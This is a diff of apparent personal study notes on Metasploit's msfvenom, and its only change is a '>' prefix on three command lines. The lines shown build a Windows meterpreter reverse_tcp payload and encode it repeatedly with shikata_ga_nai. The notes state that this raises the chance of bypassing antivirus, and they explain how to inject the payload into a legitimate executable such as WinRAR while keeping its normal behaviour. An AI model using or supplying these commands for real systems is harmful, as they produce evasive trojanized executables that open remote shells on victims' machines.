@@ -54,7 +54,7 @@ msfvenom --list encoders
 
 best <- x86/shikata_ga_nai  ploymorphic xor additive feedback encoder
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=   LPORT = ..... -e x86/shikata_ga_nai -f exe > payload
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=   LPORT = ..... -e x86/shikata_ga_nai -f exe > payload
 ```bash
  output: Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 		xB6/shikata_ga_nai succeeded with size 381 (iteration=0)
@@ -68,7 +68,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=   LPORT = ..... -e x86/shikat
   more interation of encode more chance of bypassing the AV
   
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT =<PORT> -i 10 -e x86/shikata_ga_nai -f exe > payload
+>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT =<PORT> -i 10 -e x86/shikata_ga_nai -f exe > payload
  
  	output:
 		Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
@@ -94,7 +94,7 @@ but it is much smaller than windows payloads
 
 #  Injecting Payloads Into Windows Portable Executables 
 
-msfvenom -x or --template for specify custom template also use -k or --keep to save behaviour and inject payload as a new thread
+>msfvenom -x or --template for specify custom template also use -k or --keep to save behaviour and inject payload as a new thread
 
 BEST option winRAR executable
 
